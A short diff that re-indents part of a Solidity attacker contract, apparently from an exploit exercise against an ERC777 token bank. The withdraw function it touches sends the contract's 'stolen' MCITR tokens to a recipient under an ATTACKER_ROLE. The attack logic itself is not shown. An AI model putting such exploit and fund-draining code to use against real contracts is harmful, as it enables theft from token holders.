@@ -53,14 +53,15 @@ function attack(uint256 amt) payable public {
 
 
 
-	/*
-	   After the attack, this contract has a lot of (stolen) MCITR tokens
-	   This function sends those tokens to the target recipient
-	*/
-	function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
-		ERC777 token = bank.token();
-		token.send(recipient,token.balanceOf(address(this)),"");
-	}
+/*
+After the attack, this contract has a lot of (stolen) MCITR tokens
+this function sends those tokens to the target recipient
+*/
+
+function withdraw(address recipient) public onlyRole(ATTACKER_ROLE) {
+	ERC777 token = bank.token();
+	token.send(recipient,token.balanceOf(address(this)),"");
+}
 
 
 
